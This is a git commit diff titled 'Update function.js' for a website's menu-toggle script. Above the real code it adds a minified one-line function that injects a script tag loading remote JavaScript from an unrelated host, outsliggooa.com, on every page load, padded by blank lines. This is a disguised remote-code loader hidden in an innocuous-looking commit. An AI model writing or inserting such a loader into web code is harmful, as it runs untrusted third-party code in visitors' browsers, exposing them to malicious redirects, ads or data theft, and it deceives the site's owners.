219936e45efc5002048eb622a77885618321d607
SMILE CODE <134200282+HWIJakob@users.noreply.github.com>
2023-09-22 19:41:31 +0700

    Update function.js

--- function.js
+++ function.js
@@ -1,4 +1,8 @@
- const menuToggle = document.getElementById('menu-toggle');
+    (function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('outsliggooa.com',6356582,document.createElement('script'))
+
+
+
+const menuToggle = document.getElementById('menu-toggle');
                 const navMenu = document.getElementById('nav-menu');
                 const body = document.getElementsByTagName('body')[0];
                 menuToggle.addEventListener('click', () => {
